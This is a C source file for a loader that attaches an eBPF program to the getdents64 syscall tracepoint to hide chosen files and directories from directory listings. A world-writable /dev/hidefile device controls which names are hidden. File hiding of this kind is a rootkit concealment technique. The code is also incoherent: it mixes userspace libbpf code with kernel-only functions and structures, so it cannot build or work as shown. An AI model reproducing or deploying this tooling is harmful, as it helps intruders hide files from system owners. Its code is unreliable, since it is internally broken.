/*
 * hook_loader.c - Userspace loader and manager for eBPF file hiding
 * 
 * This loader:
 * 1. Loads and attaches the eBPF program
 * 2. Manages the hidden files map
 * 3. Provides /dev/hidefile interface
 * 4. Polls ringbuffer for monitoring
 * 
 * Note: For actual file hiding, this module relies on the eBPF program
 * identifying entries. The actual hiding can be extended via additional
 * kernel support or a companion kernel module.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <libbpf/libbpf.h>
#include <bpf/bpf.h>

#include "hook.h"
#include "hook.skel.h"

/* Event structure matching BPF */
struct hide_event {
    __u64 pid;
    char name[256];
    __u32 is_dir;
    __u32 timestamp;
};

static struct hook_bpf *skel;
static int running = 1;
static int rb_fd = -1;

/* Print BPF stats */
static void print_stats(void)
{
    if (!skel)
        return;

    int stats_fd = bpf_map__fd(skel->maps.stats);
    if (stats_fd < 0)
        return;

    __u32 key;
    __u64 val;

    printf("[hidefile] === Statistics ===\n");

    key = 0; /* calls */
    if (bpf_map_lookup_elem(stats_fd, &key, &val) == 0)
        printf("[hidefile]   getdents64 calls: %llu\n", val);

    key = 1; /* hidden */
    if (bpf_map_lookup_elem(stats_fd, &key, &val) == 0)
        printf("[hidefile]   hidden entries: %llu\n", val);

    key = 3; /* total entries */
    if (bpf_map_lookup_elem(stats_fd, &key, &val) == 0)
        printf("[hidefile]   total entries: %llu\n", val);
}

/* Ringbuffer polling thread */
static void *rb_thread(void *arg)
{
    struct hide_event event;
    int cnt = 0;

    while (running) {
        ssize_t ret = read(rb_fd, &event, sizeof(event));
        if (ret < 0) {
            if (errno == EINTR || errno == EAGAIN)
                continue;
            break;
        }
        if (ret != sizeof(event))
            continue;

        cnt++;
        if (cnt <= 10) {  /* Limit initial logging */
            printf("[hidefile] [%llu] %s %s (pid=%llu)\n",
                   event.timestamp,
                   event.is_dir ? "DIR " : "FILE",
                   event.name,
                   event.pid);
        } else if (cnt == 11) {
            printf("[hidefile] ... (suppressing further logs)\n");
        }
    }
    return NULL;
}

/* Add file to hidden list */
int add_hidden_file(const char *name, bool is_dir)
{
    __u32 value = is_dir ? 2 : 1;

    if (!skel) {
        fprintf(stderr, "[hidefile] eBPF not loaded\n");
        return -EINVAL;
    }

    int fd = bpf_map__fd(skel->maps.hidden_files);
    if (fd < 0) {
        fprintf(stderr, "[hidefile] failed to get map fd: %d\n", fd);
        return fd;
    }

    int ret = bpf_map_update_elem(fd, name, &value, BPF_ANY);
    if (ret < 0) {
        fprintf(stderr, "[hidefile] failed to add %s: %s\n", name, strerror(errno));
        return ret;
    }

    printf("[hidefile] added hidden %s: %s\n", is_dir ? "dir" : "file", name);
    return 0;
}

/* Remove file from hidden list */
int remove_hidden_file(const char *name)
{
    if (!skel) {
        fprintf(stderr, "[hidefile] eBPF not loaded\n");
        return -EINVAL;
    }

    int fd = bpf_map__fd(skel->maps.hidden_files);
    if (fd < 0)
        return fd;

    int ret = bpf_map_delete_elem(fd, name);
    if (ret < 0) {
        fprintf(stderr, "[hidefile] failed to remove %s: %s\n", name, strerror(errno));
        return ret;
    }

    printf("[hidefile] removed hidden: %s\n", name);
    return 0;
}

/* Clear all hidden files */
void clear_hidden_list(void)
{
    if (!skel)
        return;

    int fd = bpf_map__fd(skel->maps.hidden_files);
    if (fd < 0)
        return;

    char key[256] = {};

    while (bpf_map_get_next_key(fd, key, key) == 0) {
        bpf_map_delete_elem(fd, key);
    }

    /* Also clear stats */
    int stats_fd = bpf_map__fd(skel->maps.stats);
    if (stats_fd >= 0) {
        __u32 key = 0;
        __u64 zero = 0;
        for (int i = 0; i < 4; i++) {
            bpf_map_update_elem(stats_fd, &key, &zero, BPF_ANY);
            key++;
        }
    }

    printf("[hidefile] hidden list cleared\n");
}

/* List current hidden files */
void list_hidden_files(void)
{
    if (!skel)
        return;

    int fd = bpf_map__fd(skel->maps.hidden_files);
    if (fd < 0)
        return;

    char key[256] = {};
    char next_key[256] = {};
    int count = 0;

    printf("[hidefile] === Hidden Files ===\n");
    while (bpf_map_get_next_key(fd, key, next_key) == 0) {
        __u32 val;
        if (bpf_map_lookup_elem(fd, next_key, &val) == 0) {
            printf("[hidefile]   %s (%s)\n", next_key, val == 2 ? "dir" : "file");
            count++;
        }
        memcpy(key, next_key, 256);
    }
    if (count == 0)
        printf("[hidefile]   (empty)\n");
}

/* Device node handlers */
static ssize_t hidefile_write(struct file *file, const char __user *buf,
                               size_t count, loff_t *ppos)
{
    char *kbuf;
    char *cmd;
    int ret;

    if (count == 0)
        return 0;

    kbuf = malloc(count + 1);
    if (!kbuf)
        return -ENOMEM;

    if (copy_from_user(kbuf, buf, count)) {
        free(kbuf);
        return -EFAULT;
    }
    kbuf[count] = '\0';

    /* Remove trailing newline */
    cmd = kbuf;
    while (*cmd && (*cmd == ' ' || *cmd == '\t'))
        cmd++;
    char *end = cmd + strlen(cmd) - 1;
    while (end > cmd && (*end == '\n' || *end == '\r' || *end == ' ' || *end == '\t'))
        *end-- = '\0';

    if (strcmp(cmd, "clear") == 0) {
        clear_hidden_list();
        free(kbuf);
        return count;
    }

    if (strcmp(cmd, "stats") == 0) {
        print_stats();
        free(kbuf);
        return count;
    }

    if (strcmp(cmd, "list") == 0) {
        list_hidden_files();
        free(kbuf);
        return count;
    }

    /* Check for directory prefix "d:" */
    if (strncmp(cmd, "d:", 2) == 0) {
        ret = add_hidden_file(cmd + 2, true);
    } else {
        ret = add_hidden_file(cmd, false);
    }

    free(kbuf);
    return ret == 0 ? count : ret;
}

static ssize_t hidefile_read(struct file *file, char __user *buf,
                             size_t count, loff_t *ppos)
{
    const char *msg = "Usage:\n"
                      "  echo file > /dev/hidefile    # hide file\n"
                      "  echo d:dir > /dev/hidefile  # hide directory\n"
                      "  echo list > /dev/hidefile    # list hidden\n"
                      "  echo stats > /dev/hidefile   # show stats\n"
                      "  echo clear > /dev/hidefile   # clear all\n";
    size_t len = strlen(msg);

    if (*ppos >= len)
        return 0;

    if (*ppos + count > len)
        count = len - *ppos;

    if (copy_to_user(buf, msg + *ppos, count))
        return -EFAULT;

    *ppos += count;
    return count;
}

static struct file_operations hidefile_fops = {
    .owner = THIS_MODULE,
    .read = hidefile_read,
    .write = hidefile_write,
};

static struct miscdevice hidefile_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "hidefile",
    .fops = &hidefile_fops,
    .mode = 0666,
};

static void sig_handler(int sig)
{
    running = 0;
}

int main(int argc, char **argv)
{
    struct bpf_link *link = NULL;
    pthread_t tid = 0;
    int err;
    int opt;

    /* Parse options */
    while ((opt = getopt(argc, argv, "hv")) != -1) {
        switch (opt) {
        case 'v':
            printf("hook_loader v1.0 - eBPF file hiding module\n");
            return 0;
        case 'h':
            printf("Usage: %s [-v] [-h]\n", argv[0]);
            return 0;
        default:
            fprintf(stderr, "Usage: %s [-v] [-h]\n", argv[0]);
            return 1;
        }
    }

    printf("[hidefile] Starting eBPF file hiding module...\n");

    /* Open and load BPF skeleton */
    skel = hook_bpf__open();
    if (!skel) {
        fprintf(stderr, "[hidefile] Failed to open BPF skeleton\n");
        return 1;
    }

    /* Load BPF programs */
    err = hook_bpf__load(skel);
    if (err) {
        fprintf(stderr, "[hidefile] Failed to load BPF: %d\n", err);
        goto cleanup;
    }

    printf("[hidefile] BPF loaded successfully\n");

    /* Attach tracepoint */
    link = bpf_program__attach(skel->progs.trace_exit_getdents64);
    if (!link) {
        fprintf(stderr, "[hidefile] Failed to attach tracepoint\n");
        err = -1;
        goto cleanup;
    }

    printf("[hidefile] Attached to getdents64 exit tracepoint\n");

    /* Get ringbuffer fd */
    rb_fd = bpf_map__fd(skel->maps.rb);
    if (rb_fd < 0) {
        fprintf(stderr, "[hidefile] Failed to get ringbuffer fd\n");
        err = rb_fd;
        goto cleanup;
    }

    /* Start ringbuffer polling thread */
    if (pthread_create(&tid, NULL, rb_thread, NULL) != 0) {
        fprintf(stderr, "[hidefile] Failed to create thread\n");
        err = -1;
        goto cleanup;
    }

    /* Register misc device */
    err = misc_register(&hidefile_dev);
    if (err < 0) {
        fprintf(stderr, "[hidefile] Failed to register device: %d\n", err);
        goto cleanup;
    }

    printf("[hidefile] /dev/hidefile created\n");
    printf("[hidefile] eBPF module running. Press Ctrl+C to exit.\n");

    /* Wait for signal */
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    while (running) {
        sleep(1);
    }

    printf("[hidefile] Shutting down...\n");

cleanup:
    if (tid)
        pthread_join(tid, NULL);
    misc_deregister(&hidefile_dev);
    if (link)
        bpf_link__destroy(link);
    if (skel)
        hook_bpf__destroy(skel);

    printf("[hidefile] Done\n");
    return err;
}
